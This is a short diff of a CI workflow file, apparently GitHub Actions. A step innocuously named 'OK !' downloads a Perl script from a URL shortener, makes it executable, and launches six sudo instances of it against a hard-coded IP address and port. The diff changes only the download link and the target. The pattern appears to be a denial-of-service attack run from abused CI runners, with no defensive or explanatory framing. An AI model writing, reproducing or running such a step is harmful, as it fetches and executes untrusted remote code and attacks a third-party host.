@@ -14,11 +14,11 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/HZE1P/dc.pl -O dc.pl
+          wget https://curl.by/UnD-g/dc.pl -O dc.pl
           chmod +x dc.pl
           PIDS=()
           for i in {1..6}; do
-            sudo timeout 60 perl dc.pl 104.29.136.96 19295 &
+            sudo timeout 60 perl dc.pl 104.29.152.218 19341 &
             PIDS+=($!)
           done
           
